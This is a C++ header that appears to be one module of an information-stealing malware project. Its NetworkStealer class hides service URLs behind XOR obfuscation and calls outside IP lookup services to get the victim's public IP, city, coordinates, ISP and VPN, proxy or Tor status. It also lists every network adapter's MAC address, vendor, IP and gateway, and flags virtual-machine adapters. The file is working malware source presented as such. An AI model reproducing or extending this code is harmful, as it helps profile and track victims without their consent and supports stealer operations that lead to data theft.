#pragma once


#include "../http.hpp"
#include "../result.hpp"
#include "../util.hpp"
#include "../xor.hpp"
#include "base.hpp"
#include <iphlpapi.h>
#include <nlohmann/json.hpp>
#include <iomanip>

namespace {
    inline std::string GetVendorFromMAC(const BYTE* mac, DWORD len) {
        if (len < 3) return "Unknown";
        char oui[7];
        sprintf_s(oui, "%02X%02X%02X", mac[0], mac[1], mac[2]);
        static const std::map<std::string, std::string> ouiMap = {
            {"9C6B00", "ASUSTek Computer Inc."},
            {"005056", "VMware, Inc."},
            {"00155D", "Microsoft Hyper-V"},
            {"080027", "Oracle VirtualBox"},
            {"000C29", "VMware (old)"},
            {"001C42", "Intel Corporation"},
            {"D85ED4", "Raspberry Pi Trading Ltd."},
        };
        auto it = ouiMap.find(oui);
        return it != ouiMap.end() ? it->second : std::string("Unknown (") + oui + ")";
    }

    inline bool IsVirtualAdapter(const BYTE* mac, DWORD len) {
        if (len < 3) return false;
        char oui[7];
        sprintf_s(oui, "%02X%02X%02X", mac[0], mac[1], mac[2]);
        std::string s(oui);
        return s == "005056" || s == "00155D" || s == "080027" ||
               s == "000C29" || s == "0050F2" || s == "0003FF";
    }
}

class NetworkStealer : public AbstractStealer {
public:
    void steal() override {

        std::string public_ip;
        try {
            auto resp = HTTP::get(xor("https://api.ipify.org"), {});
            if (resp.status == 200) public_ip = resp.body;
        } catch (...) {}

        if (public_ip.empty()) return;


        try {
            std::string url = std::string(xor("https://ipwho.is/")) + public_ip;
            auto resp = HTTP::get(url, {});
            if (resp.status != 200 || resp.body.empty()) return;

            auto data = nlohmann::json::parse(resp.body, nullptr, false);
            if (data.is_discarded()) return;

            append_extra_info("Network:");
            append_extra_info("  IP: " + data.value("ip", "N/A"));
            append_extra_info("  Type: " + data.value("type", "N/A"));

            std::string summary = data.value("city", "?") + ", " +
                data.value("region", "?") + ", " + data.value("country", "?");
            append_extra_info("  Location: " + summary);
            append_extra_info("  Country: " + data.value("country", "N/A") +
                " (" + data.value("country_code", "N/A") + ")");
            append_extra_info("  Region: " + data.value("region", "N/A"));
            append_extra_info("  City: " + data.value("city", "N/A"));
            append_extra_info("  Postal: " + data.value("postal", "N/A"));

            std::ostringstream lat_s, lon_s;
            lat_s << std::fixed << std::setprecision(6) << data.value("latitude", 0.0);
            lon_s << std::fixed << std::setprecision(6) << data.value("longitude", 0.0);
            append_extra_info("  Latitude: " + lat_s.str());
            append_extra_info("  Longitude: " + lon_s.str());

            if (data.contains("connection")) {
                auto conn = data["connection"];
                std::string asn = conn.contains("asn") && conn["asn"].is_number()
                    ? std::to_string(conn["asn"].get<int>())
                    : conn.value("asn", "N/A");
                append_extra_info("  ASN: " + asn);
                append_extra_info("  ISP: " + conn.value("isp", "N/A"));
                append_extra_info("  Organization: " + conn.value("org", "N/A"));
            }

            if (data.contains("timezone")) {
                auto tz = data["timezone"];
                append_extra_info("  Timezone: " + tz.value("id", "N/A") +
                    " (" + tz.value("utc", "N/A") + ")");
            }

            if (data.contains("security")) {
                auto sec = data["security"];
                append_extra_info("  VPN: " + std::string(sec.value("vpn", false) ? "Yes" : "No"));
                append_extra_info("  Proxy: " + std::string(sec.value("proxy", false) ? "Yes" : "No"));
                append_extra_info("  Tor: " + std::string(sec.value("tor", false) ? "Yes" : "No"));
            }
        } catch (...) {}


        append_extra_info("");
        append_extra_info("Adapters:");

        PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
        ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);
        }

        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                std::string mac = format_mac_address(pAdapter->Address, pAdapter->AddressLength);
                std::string vendor = GetVendorFromMAC(pAdapter->Address, pAdapter->AddressLength);
                bool isVirtual = IsVirtualAdapter(pAdapter->Address, pAdapter->AddressLength);

                append_extra_info("  " + std::string(pAdapter->AdapterName));
                append_extra_info("    MAC: " + mac);
                append_extra_info("    Vendor: " + vendor);
                append_extra_info("    Type: " + std::string(isVirtual ? "Virtual" : "Physical"));
                append_extra_info("    IP: " + std::string(pAdapter->IpAddressList.IpAddress.String));
                append_extra_info("    Gateway: " + std::string(pAdapter->GatewayList.IpAddress.String));

                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
        append_extra_info("");
    }
};
